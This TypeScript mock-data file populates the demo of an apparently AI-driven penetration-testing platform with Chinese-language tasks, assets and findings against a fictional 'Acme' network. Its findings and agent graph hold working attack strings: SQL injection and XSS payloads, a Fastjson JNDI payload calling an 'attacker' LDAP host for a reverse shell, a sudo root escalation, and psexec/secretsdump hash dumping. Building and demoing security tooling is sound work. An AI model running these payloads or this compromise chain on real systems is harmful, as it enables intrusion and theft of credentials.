// Rich mock dataset for the Vercel demo (NEXT_PUBLIC_MOCK=1). Shapes track the
// current backend contract in lib/api.ts + lib/types.ts. All data is static and
// self-consistent (one company "Acme", a few tasks, findings, exploration graph,
// sessions/activity, traffic, agents, etc.) so every page looks populated.

import type {
  Activity, Agent, AgentDetail, Asset, Audit, Company, Conversation,
  ConvTokenSummary, DailyTokenBucket, Edge, Finding, InterceptApprovalRow,
  InterceptPending, InterceptRule, LLMPoolStatus, LLMProfile, MCPServer, MCPTool, PromptVar,
  PromptVersion, Settings, SessionTokenUsage, SkillCall, SkillItem, MissingSkill, Stats, TaskNode, Task, TokenTotal,
  TaskTemplate, TokenUsage, Tool, TrafficResp, TrafficDetail, TrafficHost, LLMTask,
} from "@/lib/types";

const T = (iso: string) => iso; // readability helper for timestamps

// ── Tasks ──────────────────────────────────────────────────────────────────
export const ACTIVE_TASK = "t-acme-web";

export const tasks: Task[] = [
  {
    id: "t-acme-web",
    description: "Acme 官网与后台外部渗透（acme.com）",
    goal: "拿到 acme.com 后台管理权限，确认可读取用户敏感数据。",
    status: "running",
    created_at: T("2026-07-24T09:12:00Z"),
    created_unix: 1785489120,
    last_activity: T("2026-07-26T03:58:22Z"),
    last_activity_unix: 1785643102,
    paused: false, active: true, in_flight: 3, stalled: false,
    goals_total: 5, goals_met: 2, engine_mode: "exploring",
    llm_profile_id: 1,
    llm_profile_ids: [1, 2],
    active_llm_profile_id: 1,
    llm_failover_state: "ready",
    source_task_ids: [],
    tokens: { input_tokens: 1284500, output_tokens: 96320, cache_read_tokens: 890400, cache_write_tokens: 132000 },
  },
  {
    id: "t-acme-api",
    description: "api.acme.com 越权与注入测试",
    goal: "评估 api.acme.com 订单/用户接口的越权(IDOR)与注入风险。",
    status: "running",
    created_at: T("2026-07-25T14:05:00Z"),
    created_unix: 1785592500,
    last_activity: T("2026-07-26T03:40:10Z"),
    last_activity_unix: 1785642010,
    paused: false, active: false, in_flight: 2, stalled: false,
    goals_total: 4, goals_met: 1, engine_mode: "exploring",
    llm_profile_id: 1,
    llm_profile_ids: [1, 2],
    active_llm_profile_id: 1,
    llm_failover_state: "ready",
    source_task_ids: ["t-acme-web"],
    tokens: { input_tokens: 642300, output_tokens: 51200, cache_read_tokens: 401000, cache_write_tokens: 60000 },
  },
  {
    id: "t-shop-pay",
    description: "shop.acme.com 支付与订单链路",
    goal: "评估支付与订单接口的越权、金额篡改与竞态风险。",
    status: "paused",
    created_at: T("2026-07-22T08:30:00Z"),
    created_unix: 1785313800,
    last_activity: T("2026-07-23T18:40:10Z"),
    last_activity_unix: 1785436810,
    paused: true, active: false, in_flight: 0, stalled: false,
    goals_total: 4, goals_met: 1, engine_mode: "paused",
    llm_profile_id: 2,
    llm_profile_ids: [2, 1],
    active_llm_profile_id: 2,
    llm_failover_state: "ready",
    source_task_ids: ["t-acme-web", "t-acme-api"],
    tokens: { input_tokens: 233000, output_tokens: 18700, cache_read_tokens: 120000, cache_write_tokens: 22000 },
  },
  {
    id: "t-vpn-edge",
    description: "对外暴露面侦察（VPN / 边界服务）",
    goal: "识别 acme.com 对外暴露的可利用边界服务。",
    status: "done",
    created_at: T("2026-07-18T08:00:00Z"),
    created_unix: 1784966400,
    completed_at: T("2026-07-20T22:11:00Z"),
    completed_unix: 1785190260,
    last_activity: T("2026-07-20T22:11:00Z"),
    last_activity_unix: 1785190260,
    paused: false, active: false, in_flight: 0, stalled: false,
    goals_total: 3, goals_met: 3, engine_mode: "idle",
    llm_profile_id: 1,
    llm_profile_ids: [1],
    active_llm_profile_id: 1,
    llm_failover_state: "ready",
    source_task_ids: [],
    tokens: { input_tokens: 512000, output_tokens: 40100, cache_read_tokens: 300000, cache_write_tokens: 41000 },
  },
];

export const taskTemplates: TaskTemplate[] = [
  {
    id: 1,
    name: "外部 Web 渗透",
    description: "对目标互联网暴露面开展黑盒渗透测试，覆盖站点、接口和常见管理入口。",
    goal: "识别并验证可造成未授权访问、敏感数据泄露或服务器失陷的安全问题。",
    created_at: T("2026-07-20T08:00:00Z"),
    updated_at: T("2026-07-25T08:00:00Z"),
  },
  {
    id: 2,
    name: "API 越权专项",
    description: "围绕目标 API 的身份认证、对象级授权和角色边界开展专项测试。",
    goal: "确认是否存在 IDOR、水平越权、垂直越权及批量数据访问风险。",
    created_at: T("2026-07-19T08:00:00Z"),
    updated_at: T("2026-07-24T08:00:00Z"),
  },
];

export const getTask = (id: string) => tasks.find((t) => t.id === id);

const grandTotal: TokenTotal = tasks.reduce(
  (a, t) => ({
    input_tokens: a.input_tokens + (t.tokens?.input_tokens ?? 0),
    output_tokens: a.output_tokens + (t.tokens?.output_tokens ?? 0),
    cache_read_tokens: a.cache_read_tokens + (t.tokens?.cache_read_tokens ?? 0),
    cache_write_tokens: a.cache_write_tokens + (t.tokens?.cache_write_tokens ?? 0),
  }),
  { input_tokens: 0, output_tokens: 0, cache_read_tokens: 0, cache_write_tokens: 0 },
);

// ── Stats ──────────────────────────────────────────────────────────────────
export function stats(
  taskId?: string,
  state: { tasks?: readonly Task[]; findings?: readonly Finding[]; activeTask?: string } = {},
): Stats & { active_task?: unknown } {
  const taskList = state.tasks ?? tasks;
  const findingList = state.findings ?? findings;
  const base: Stats = {
    assets: assets.length,
    engine_mode: "exploring",
    llm_configured: true,
    roe_enabled: true,
    findings_confirmed: findingList.filter((f) => f.severity !== "low").length,
  };
  const selectedTaskID = taskId ?? state.activeTask ?? ACTIVE_TASK;
  const t = taskList.find((item) => item.id === selectedTaskID);
  if (!t) return base;
  return {
    ...base,
    engine_mode: t.engine_mode ?? "idle",
    findings_confirmed: findingList.filter((f) => f.task_id === t.id).length,
    active_task: {
      id: t.id, in_flight: t.in_flight, goals_total: t.goals_total,
      goals_met: t.goals_met, engine_mode: t.engine_mode, paused: t.paused,
    },
  };
}

// ── Company + Assets (new unified model) ─────────────────────────────────────
export const companies: Company[] = [
  {
    id: 1, name: "Acme Corp", logo: "",
    asset_count: 18,
    scope: [
      { id: 1, company_id: 1, kind: "domain", domain: "acme.com", raw: "acme.com", reason: "主域" },
      { id: 2, company_id: 1, kind: "cidr", net: "203.0.113.0/24", raw: "203.0.113.0/24" },
      { id: 3, company_id: 1, kind: "ip", net: "198.51.100.20", raw: "198.51.100.20" },
    ],
  },
];

export const assets: Asset[] = [
  { id: 1, type: "root_domain", company_id: 1, task_ids: [1], domain: "acme.com", root_domain: "acme.com", icp: "京ICP备2021xxxx号", record_type: "A", record_value: ["203.0.113.10"], last_seen: T("2026-07-26T02:00:00Z") },
  { id: 2, type: "subdomain", company_id: 1, task_ids: [1], domain: "www.acme.com", root_domain: "acme.com", record_type: "CNAME", record_value: "acme.com", last_seen: T("2026-07-26T02:01:00Z") },
  { id: 3, type: "subdomain", company_id: 1, task_ids: [2], domain: "api.acme.com", root_domain: "acme.com", record_type: "A", record_value: ["203.0.113.11"], last_seen: T("2026-07-26T02:02:00Z") },
  { id: 4, type: "subdomain", company_id: 1, task_ids: [3], domain: "shop.acme.com", root_domain: "acme.com", record_type: "A", record_value: ["203.0.113.12"], last_seen: T("2026-07-26T02:03:00Z") },
  { id: 5, type: "subdomain", company_id: 1, task_ids: [4], domain: "vpn.acme.com", root_domain: "acme.com", record_type: "A", record_value: ["198.51.100.20"], last_seen: T("2026-07-20T02:00:00Z") },
  { id: 6, type: "subdomain", company_id: 1, task_ids: [1], domain: "admin.acme.com", root_domain: "acme.com", record_type: "A", record_value: ["203.0.113.10"], last_seen: T("2026-07-26T02:04:00Z") },
  { id: 7, type: "ip", company_id: 1, task_ids: [1, 2], ip: "203.0.113.10", c_segment: "203.0.113.0", open_ports: [{ port: 80, service: "http" }, { port: 443, service: "https" }, { port: 22, service: "ssh" }], last_seen: T("2026-07-26T02:05:00Z") },
  { id: 8, type: "ip", company_id: 1, task_ids: [2], ip: "203.0.113.11", c_segment: "203.0.113.0", open_ports: [{ port: 443, service: "https" }], last_seen: T("2026-07-26T02:06:00Z") },
  { id: 9, type: "ip", company_id: 1, task_ids: [4], ip: "198.51.100.20", c_segment: "198.51.100.0", open_ports: [{ port: 443, service: "https" }, { port: 500, service: " isakmp" }], last_seen: T("2026-07-20T02:00:00Z") },
  { id: 10, type: "service", company_id: 1, task_ids: [1], ip: "203.0.113.10", port: 443, service_type: "https", service_name: "nginx/1.24.0", last_seen: T("2026-07-26T02:07:00Z") },
  { id: 11, type: "service", company_id: 1, task_ids: [4], ip: "198.51.100.20", port: 22, service_type: "ssh", service_name: "OpenSSH 8.9p1", last_seen: T("2026-07-20T02:00:00Z") },
  { id: 12, type: "app", company_id: 1, task_ids: [1], url: "https://www.acme.com", app_name: "Acme 官网", category: "corp", status_code: 200, content_length: 48213, page_title: "Acme Corp — 企业官网", technologies: ["Nginx", "React", "Cloudflare"], favicon_mmh3: "-1580860059", last_seen: T("2026-07-26T02:08:00Z") },
  { id: 13, type: "app", company_id: 1, task_ids: [1], url: "https://admin.acme.com", app_name: "后台管理", category: "admin", status_code: 200, content_length: 12044, page_title: "Acme Admin 登录", technologies: ["Nginx", "Vue", "Element-UI"], last_seen: T("2026-07-26T02:09:00Z") },
  { id: 14, type: "app", company_id: 1, task_ids: [2], url: "https://api.acme.com", app_name: "REST API", category: "api", status_code: 401, content_length: 45, page_title: "", technologies: ["Kong", "Node.js"], last_seen: T("2026-07-26T02:10:00Z") },
  { id: 15, type: "endpoint", company_id: 1, task_ids: [2], url: "https://api.acme.com/v1/orders", method: "GET", status_code: 200, params: [{ name: "id", in: "query" }, { name: "page", in: "query" }], last_seen: T("2026-07-26T02:11:00Z") },
  { id: 16, type: "endpoint", company_id: 1, task_ids: [2], url: "https://api.acme.com/v1/users/me", method: "GET", status_code: 200, last_seen: T("2026-07-26T02:12:00Z") },
  { id: 17, type: "endpoint", company_id: 1, task_ids: [1], url: "https://admin.acme.com/login", method: "POST", status_code: 200, params: [{ name: "username" }, { name: "password" }], last_seen: T("2026-07-26T02:13:00Z") },
  { id: 18, type: "endpoint", company_id: 1, task_ids: [1], url: "https://www.acme.com/search", method: "GET", status_code: 200, params: [{ name: "q", in: "query" }], last_seen: T("2026-07-26T02:14:00Z") },
  // 内网资产（DMZ→内网横向发现）
  { id: 19, type: "ip", company_id: 1, task_ids: [1], ip: "10.0.20.15", c_segment: "10.0.20.0", open_ports: [{ port: 80, service: "http" }, { port: 22, service: "ssh" }], last_seen: T("2026-07-25T15:40:00Z") },
  { id: 20, type: "ip", company_id: 1, task_ids: [1], ip: "10.10.10.10", c_segment: "10.10.10.0", open_ports: [{ port: 88, service: "kerberos" }, { port: 389, service: "ldap" }, { port: 445, service: "smb" }], last_seen: T("2026-07-25T21:00:00Z") },
  { id: 21, type: "ip", company_id: 1, task_ids: [1], ip: "10.10.10.5", c_segment: "10.10.10.0", open_ports: [{ port: 445, service: "smb" }], last_seen: T("2026-07-25T21:00:00Z") },
  { id: 22, type: "ip", company_id: 1, task_ids: [1], ip: "10.10.10.20", c_segment: "10.10.10.0", open_ports: [{ port: 8080, service: "http-proxy" }], last_seen: T("2026-07-25T21:00:00Z") },
  { id: 23, type: "service", company_id: 1, task_ids: [1], ip: "10.10.10.20", port: 8080, service_type: "http", service_name: "Jenkins 2.289", last_seen: T("2026-07-25T21:35:00Z") },
  { id: 24, type: "service", company_id: 1, task_ids: [1], ip: "10.10.10.10", port: 445, service_type: "smb", service_name: "Windows Server 2019 DC", last_seen: T("2026-07-25T23:55:00Z") },
  { id: 25, type: "app", company_id: 1, task_ids: [1], url: "http://10.10.10.20:8080", app_name: "Jenkins (内部)", category: "ci", status_code: 200, content_length: 14200, page_title: "Jenkins Dashboard", technologies: ["Jenkins", "Java"], last_seen: T("2026-07-25T21:35:00Z") },
  { id: 26, type: "endpoint", company_id: 1, task_ids: [1], url: "http://10.10.10.20:8080/script", method: "GET", status_code: 200, last_seen: T("2026-07-25T21:35:00Z") },
];

export const assetCounts: Record<string, number> = assets.reduce<Record<string, number>>((m, a) => {
  m[a.type] = (m[a.type] ?? 0) + 1;
  return m;
}, {});

// ── Findings ─────────────────────────────────────────────────────────────────
export const findings: Finding[] = [
  { id: "f-1", vulnclass: "SQL Injection", name: "官网搜索接口报错型 SQL 注入", severity: "high", status: "pending", report: "## 漏洞概述\n\n`www.acme.com/search` 的 `q` 参数存在**报错型 SQL 注入**（MSSQL），可读取数据库版本、库结构乃至敏感数据。\n\n## 影响\n\n- 可读取 `acme_prod` 库的表结构与用户/订单数据\n- 报错回显便于快速构造利用，风险高\n\n## 复现步骤\n\n1. 触发报错注入：\n\n```\nGET /search?q=1' AND 1=CONVERT(int,@@version)--\n```\n\n2. 响应回显 MSSQL 版本报错，确认可注入\n3. 进一步枚举库：`sqlmap -u \"https://www.acme.com/search?q=1\" --dbs`\n\n## 修复建议\n\n- 全部改用参数化查询/预编译语句，杜绝字符串拼接\n- 关闭生产环境详细报错回显\n- 数据库账号最小权限，禁用 `xp_cmdshell` 等危险扩展\n", summary: "www.acme.com/search q 参数存在报错型 SQL 注入", evidence: "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → 返回 MSSQL 版本报错，可读库结构。", intent_id: "i-2", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-26T01:20:00Z") },
  { id: "f-2", vulnclass: "IDOR", severity: "high", status: "pending", summary: "api.acme.com/v1/orders?id= 可越权读取他人订单", evidence: "将 id=1001 改为 id=1002 返回他人订单（含收货地址、手机号），无归属校验。", intent_id: "i-5", task_id: "t-acme-api", task_description: "api.acme.com 越权与注入测试", ts: T("2026-07-26T02:44:00Z") },
  { id: "f-3", vulnclass: "Weak JWT", severity: "high", status: "pending", summary: "API JWT 使用弱密钥、可离线爆破伪造", evidence: "HS256，密钥 'secret'，john 5 秒破解 → 可伪造任意 sub 越权。", task_id: "t-acme-api", task_description: "api.acme.com 越权与注入测试", ts: T("2026-07-26T03:02:00Z") },
  { id: "f-4", vulnclass: "Reflected XSS", severity: "medium", status: "pending", summary: "搜索页对 q 参数未转义，反射型 XSS", evidence: "q=<script>alert(document.domain)</script> 原样回显于结果标题。", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T22:10:00Z") },
  { id: "f-5", vulnclass: "Exposed .git", severity: "medium", status: "pending", summary: "www.acme.com 暴露 .git 目录，可还原源码", evidence: "GET /.git/HEAD → 200；git-dumper 还原出后端源码与数据库连接串注释。", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T20:30:00Z") },
  { id: "f-6", vulnclass: "Default Credentials", severity: "high", status: "pending", summary: "admin.acme.com 后台默认口令 admin/admin123", evidence: "登录成功，进入管理后台，可管理用户与订单。", intent_id: "i-3", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-26T03:50:00Z") },
  { id: "f-7", vulnclass: "Open Redirect", severity: "low", status: "pending", summary: "登录后 next 参数任意跳转", evidence: "/login?next=https://evil.example 登录后 302 跳到外站。", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T19:12:00Z") },
  { id: "f-8", vulnclass: "Missing Rate Limit", severity: "medium", status: "pending", summary: "登录接口无速率限制，可暴力破解", evidence: "1000 次/分钟无锁定，无验证码。", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T18:40:00Z") },
  { id: "f-9", vulnclass: "Verbose Error", severity: "low", status: "pending", summary: "API 500 返回堆栈，泄露路径与框架版本", evidence: "触发 500 返回 Node.js 堆栈，泄露绝对路径与依赖版本。", task_id: "t-acme-api", task_description: "api.acme.com 越权与注入测试", ts: T("2026-07-25T23:05:00Z") },
  { id: "f-10", vulnclass: "Outdated Component", severity: "medium", status: "pending", summary: "shop 使用存在已知 RCE 的老版本组件", evidence: "指纹识别到组件 v2.3.1，对应 CVE-2024-xxxx 反序列化 RCE。", task_id: "t-shop-pay", task_description: "shop.acme.com 支付与订单链路", ts: T("2026-07-23T15:00:00Z") },
  // ── 外网→内网纵深链路上的高危发现（active task）──
  { id: "f-11", vulnclass: "Hardcoded Credentials", severity: "high", status: "pending", summary: "泄露源码中硬编码数据库凭据 sa/Acme@2021", evidence: "git-dumper 还原 www.acme.com/.git 得到 config.php，内含明文 DB 口令，后续被证实可在内网复用。", intent_id: "ig", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T20:36:00Z") },
  { id: "f-12", vulnclass: "Deserialization RCE", name: "shop 商城 Fastjson 反序列化远程命令执行", severity: "critical", status: "confirmed", report: "## 漏洞概述\n\n`shop.acme.com` 的 `/api/import` 接口使用 **Fastjson 1.2.24** 解析用户可控 JSON，未开启 `safeMode`，可通过 `@type` 指定任意类触发 **JNDI 注入 → 远程命令执行**。\n\n## 影响\n\n- 攻击者无需认证即可在 DMZ Web 服务器上执行任意命令（`www-data@dmz-web01`）\n- 结合后续提权，成为进入内网的跳板\n\n## 复现步骤\n\n1. 构造 JNDI payload：\n\n```json\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker/Exploit\",\"autoCommit\":true}\n```\n\n2. `POST /api/import`，`Content-Type: application/json`\n3. 目标回连 dnslog，落地反弹 shell\n\n## 修复建议\n\n- 升级 Fastjson 至 **1.2.83+** 并开启 `safeMode`\n- `/api/import` 增加鉴权与来源校验\n- 出网限制：禁止业务服务器主动外联 LDAP/RMI\n", summary: "shop.acme.com Fastjson 1.2.24 反序列化远程命令执行", evidence: "POST /api/import 提交 JNDI payload（@type:JdbcRowSetImpl）→ 回连 dnslog 并落地反弹 shell（www-data@dmz-web01）。", intent_id: "i7", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T15:40:00Z") },
  { id: "f-13", vulnclass: "Privilege Escalation", severity: "high", status: "pending", summary: "DMZ 立足点 sudo NOPASSWD 错配可本地提权 root", evidence: "sudo -l 显示 (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'os.setuid(0);os.system(\"/bin/sh\")' 直接拿 root。", intent_id: "i8", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T16:20:00Z") },
  { id: "f-14", vulnclass: "Network Segmentation", severity: "medium", status: "pending", summary: "DMZ 主机双网卡直连内网，边界隔离失效", evidence: "dmz-web01 第二网卡在 10.10.10.0/24，可从 DMZ 直达域控/文件服务器/Jenkins，越过网络分区。", intent_id: "i9", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T21:00:00Z") },
  { id: "f-15", vulnclass: "Unauthenticated RCE", severity: "high", status: "pending", summary: "内部 Jenkins 未授权 Script Console 远程命令执行", evidence: "GET /script 无需登录即可执行 Groovy：'whoami'.execute().text → SYSTEM；并从凭据库导出域账号 acme\\svc_deploy。", intent_id: "i11", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T21:50:00Z") },
  { id: "f-16", vulnclass: "Kerberoasting", severity: "high", status: "pending", summary: "域服务账号 svc_sql 可被 Kerberoast 且口令弱", evidence: "GetUserSPNs 请求 svc_sql 的 TGS，hashcat -m 13100 离线破出 Sql@2020，该账号属于 SQL 管理组。", intent_id: "i12", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T23:20:00Z") },
  { id: "f-17", vulnclass: "Domain Compromise", name: "内网域控 DC01 完全控制（Domain Admin）", severity: "critical", status: "confirmed", report: "## 漏洞概述\n\n经外网 Fastjson RCE 立足 DMZ，再由 sudo 提权、双网卡穿透、Jenkins 未授权 RCE 拿到域账号 `svc_deploy`；该账号属于 **Domain Admins**，最终完全控制域控 **DC01**。\n\n## 影响\n\n- 取得域管理员权限，可控制全域主机与账号\n- `secretsdump` 导出全域 NTLM 哈希（含 `krbtgt`），可制作黄金票据长期潜伏\n- 内部靶标达成\n\n## 复现步骤\n\n1. 以 `svc_deploy` 登录并导出哈希：\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. 获得 DC01 的 SYSTEM 权限，导出域内全部哈希\n\n## 修复建议\n\n- 收敛服务账号权限，移出 Domain Admins，落实分层管理（tiering）\n- 连续两次重置 `krbtgt`，轮换服务账号强口令\n- 修复 DMZ→内网边界隔离与前述 RCE/提权链\n", summary: "拿下域控 DC01（Domain Admin）—— 内部靶标达成", evidence: "svc_deploy 属于 Domain Admins，psexec.py 以其登录 DC01 得 SYSTEM，secretsdump 导出全域 NTLM 哈希（含 krbtgt），完成靶标控制。", intent_id: "i13", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-26T00:20:00Z") },
];

// ── Exploration graph (active task) ──────────────────────────────────────────
// 现行模型：根是 fact/state=origin（渲染为「起点」）；payload 为 JSON 字符串，
// goal 取 text、其余取 summary。结构：根→目标(spawns)→意图(spawns)→事实/漏洞(yields)，
// 漏洞→目标(proves)，提示→意图(derived_from)。
const P = (o: Record<string, string>) => JSON.stringify(o);

export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
  nodes: [
    { id: "root", type: "fact", payload: P({ summary: "根：acme.com 外网→内网纵深渗透" }), priority: 0, state: "origin", origin: "system", ts: T("2026-07-24T09:12:00Z") },

    // ── 目标（由 goals agent 拆解，随发现逐步加码到内网靶标）──
    { id: "g1", type: "goal", payload: P({ text: "获取 acme.com 后台管理权限" }), priority: 9, state: "met", origin: "goals", ts: T("2026-07-24T09:13:00Z") },
    { id: "g2", type: "goal", payload: P({ text: "读取用户敏感数据" }), priority: 8, state: "open", origin: "goals", ts: T("2026-07-24T09:13:00Z") },
    { id: "g3", type: "goal", payload: P({ text: "从外网突破 DMZ，建立内网立足点" }), priority: 9, state: "met", origin: "goals", ts: T("2026-07-25T14:10:00Z") },
    { id: "g4", type: "goal", payload: P({ text: "内网横向，拿下内部靶标域控 DC01" }), priority: 10, state: "met", origin: "goals", ts: T("2026-07-25T20:00:00Z") },

    // ── 第 1 层 · 外网侦察 / 外部漏洞 ──
    { id: "i1", type: "intent", payload: P({ summary: "acme.com 子域枚举与端口扫描" }), priority: 6, state: "done", origin: "planner", ts: T("2026-07-24T09:20:00Z") },
    { id: "i2", type: "intent", payload: P({ summary: "admin 后台默认口令 / 弱口令测试" }), priority: 9, state: "done", origin: "planner", ts: T("2026-07-26T03:30:00Z") },
    { id: "i3", type: "intent", payload: P({ summary: "枚举后台功能与用户数据接口" }), priority: 8, state: "running", origin: "planner", ts: T("2026-07-26T03:55:00Z") },
    { id: "i4", type: "intent", payload: P({ summary: "www.acme.com/search 页 SQL 注入探测" }), priority: 8, state: "done", origin: "planner", ts: T("2026-07-25T22:00:00Z") },
    { id: "i5", type: "intent", payload: P({ summary: "api.acme.com 订单接口越权(IDOR)测试" }), priority: 8, state: "running", origin: "planner", ts: T("2026-07-26T02:30:00Z") },
    { id: "ig", type: "intent", payload: P({ summary: "www.acme.com .git 源码泄露与硬编码凭据提取" }), priority: 7, state: "done", origin: "planner", ts: T("2026-07-25T20:20:00Z") },

    // ── 第 2 层 · 突破 DMZ 建立立足点 ──
    { id: "i6", type: "intent", payload: P({ summary: "shop.acme.com 组件指纹识别与 CVE 关联" }), priority: 7, state: "done", origin: "planner", ts: T("2026-07-25T14:20:00Z") },
    { id: "i7", type: "intent", payload: P({ summary: "触发 shop 反序列化 RCE，获取反弹 shell" }), priority: 9, state: "done", origin: "planner", ts: T("2026-07-25T15:10:00Z") },
    { id: "i8", type: "intent", payload: P({ summary: "DMZ 立足点本地信息收集与提权至 root" }), priority: 8, state: "done", origin: "planner", ts: T("2026-07-25T16:00:00Z") },

    // ── 第 3 层 · 内网横向纵深（多层测试）──
    { id: "i9", type: "intent", payload: P({ summary: "以立足点为 pivot 做内网主机发现" }), priority: 8, state: "done", origin: "planner", ts: T("2026-07-25T20:30:00Z") },
    { id: "i10", type: "intent", payload: P({ summary: "内网凭据复用与密码喷洒" }), priority: 8, state: "running", origin: "planner", ts: T("2026-07-26T03:40:00Z") },
    { id: "i11", type: "intent", payload: P({ summary: "内部 Jenkins 未授权 Groovy 脚本执行(RCE)" }), priority: 9, state: "done", origin: "planner", ts: T("2026-07-25T21:30:00Z") },
    { id: "i12", type: "intent", payload: P({ summary: "对域服务账号做 Kerberoasting 并离线破解" }), priority: 8, state: "done", origin: "planner", ts: T("2026-07-25T22:40:00Z") },
    { id: "i13", type: "intent", payload: P({ summary: "用域管理员凭据登录并控制域控 DC01" }), priority: 10, state: "done", origin: "planner", ts: T("2026-07-25T23:50:00Z") },

    // ── 事实 ──
    { id: "fa1", type: "fact", payload: P({ summary: "发现子域 admin.acme.com（Element-UI 后台）" }), priority: 0, state: "open", origin: "work#1", ts: T("2026-07-24T09:40:00Z") },
    { id: "fa2", type: "fact", payload: P({ summary: "search 页 q 参数为 error-based 注入点(MSSQL)" }), priority: 0, state: "open", origin: "work#4", ts: T("2026-07-25T22:05:00Z") },
    { id: "faGit", type: "fact", payload: P({ summary: ".git 可下载，git-dumper 还原出后端源码" }), priority: 0, state: "open", origin: "workG", ts: T("2026-07-25T20:30:00Z") },
    { id: "faCreds", type: "fact", payload: P({ summary: "源码 config.php 硬编码 DB 口令 sa / Acme@2021（疑似内网通用）" }), priority: 0, state: "open", origin: "workG", ts: T("2026-07-25T20:35:00Z") },
    { id: "fa3", type: "fact", payload: P({ summary: "shop 指纹命中 Fastjson 1.2.24（存在已知反序列化 RCE）" }), priority: 0, state: "open", origin: "work#6", ts: T("2026-07-25T14:40:00Z") },
    { id: "fa4", type: "fact", payload: P({ summary: "反弹 shell 成功：www-data@dmz-web01(10.0.20.15)，位于 DMZ 段" }), priority: 0, state: "open", origin: "work#7", ts: T("2026-07-25T15:40:00Z") },
    { id: "fa5", type: "fact", payload: P({ summary: "sudo -l：(ALL) NOPASSWD: /usr/bin/python3 → 可提权 root" }), priority: 0, state: "open", origin: "work#8", ts: T("2026-07-25T16:20:00Z") },
    { id: "fa6", type: "fact", payload: P({ summary: "立足点第二网卡直连内网 10.10.10.0/24（跨越 DMZ 边界）" }), priority: 0, state: "open", origin: "work#9", ts: T("2026-07-25T20:40:00Z") },
    { id: "fa7", type: "fact", payload: P({ summary: "内网存活：10.10.10.10 DC01(域控) / 10.10.10.5 FS01(SMB) / 10.10.10.20 JENKINS" }), priority: 0, state: "open", origin: "work#9", ts: T("2026-07-25T21:00:00Z") },
    { id: "fa8", type: "fact", payload: P({ summary: "JENKINS 控制台 /script 无鉴权，可直接执行 Groovy" }), priority: 0, state: "open", origin: "work#11", ts: T("2026-07-25T21:45:00Z") },
    { id: "fa9", type: "fact", payload: P({ summary: "从 Jenkins 凭据库导出域账号 acme\\svc_deploy 明文口令" }), priority: 0, state: "open", origin: "work#11", ts: T("2026-07-25T22:10:00Z") },
    { id: "fa10", type: "fact", payload: P({ summary: "Kerberoast 到 svc_sql 的 TGS，hashcat 破出口令 Sql@2020" }), priority: 0, state: "open", origin: "work#12", ts: T("2026-07-25T23:20:00Z") },

    // ── 漏洞 ──
    { id: "fi1", type: "finding", payload: P({ summary: "后台默认口令 admin/admin123" }), priority: 0, state: "confirmed", origin: "work#2", ts: T("2026-07-26T03:50:00Z") },
    { id: "fi2", type: "finding", payload: P({ summary: "SQL 注入（search q）可读 acme_prod 库" }), priority: 0, state: "confirmed", origin: "work#4", ts: T("2026-07-26T01:20:00Z") },
    { id: "fi3", type: "finding", payload: P({ summary: "IDOR：/v1/orders?id= 可越权读他人订单" }), priority: 0, state: "confirmed", origin: "work#5", ts: T("2026-07-26T02:44:00Z") },
    { id: "fiSrc", type: "finding", payload: P({ summary: "源码泄露 + 硬编码数据库凭据（sa/Acme@2021）" }), priority: 0, state: "confirmed", origin: "workG", ts: T("2026-07-25T20:36:00Z") },
    { id: "fiRce", type: "finding", payload: P({ summary: "shop Fastjson 反序列化 RCE，获得服务器命令执行" }), priority: 0, state: "confirmed", origin: "work#7", ts: T("2026-07-25T15:40:00Z") },
    { id: "fiPriv", type: "finding", payload: P({ summary: "DMZ 立足点本地提权至 root（sudo NOPASSWD 错配）" }), priority: 0, state: "confirmed", origin: "work#8", ts: T("2026-07-25T16:20:00Z") },
    { id: "fiJenkins", type: "finding", payload: P({ summary: "内部 Jenkins 未授权 Groovy → 服务器 RCE" }), priority: 0, state: "confirmed", origin: "work#11", ts: T("2026-07-25T21:50:00Z") },
    { id: "fiKerb", type: "finding", payload: P({ summary: "Kerberoasting 破解域服务账号 svc_sql 口令" }), priority: 0, state: "confirmed", origin: "work#12", ts: T("2026-07-25T23:20:00Z") },
    { id: "fiDC", type: "finding", payload: P({ summary: "拿下域控 DC01（Domain Admin）—— 内部靶标达成" }), priority: 0, state: "confirmed", origin: "work#13", ts: T("2026-07-26T00:20:00Z") },

    // ── 提示（主 agent 注入）──
    { id: "h1", type: "hint", payload: P({ summary: "后台是 Element-UI，优先跑默认口令表" }), priority: 5, state: "consumed", origin: "mainagent", ts: T("2026-07-26T03:20:00Z") },
    { id: "h2", type: "hint", payload: P({ summary: "内网优先打 Jenkins：未授权 /script 直接 Groovy RCE" }), priority: 6, state: "consumed", origin: "mainagent", ts: T("2026-07-25T21:20:00Z") },
    { id: "h3", type: "hint", payload: P({ summary: "源码里那组 DB 口令拿去内网喷洒，大概率通用" }), priority: 6, state: "consumed", origin: "mainagent", ts: T("2026-07-25T23:10:00Z") },
  ],
  edges: [
    // 根 → 目标
    { src: "root", dst: "g1", rel: "spawns" },
    { src: "root", dst: "g2", rel: "spawns" },
    { src: "root", dst: "g3", rel: "spawns" },
    { src: "root", dst: "g4", rel: "spawns" },
    // 目标 → 意图
    { src: "g1", dst: "i1", rel: "spawns" },
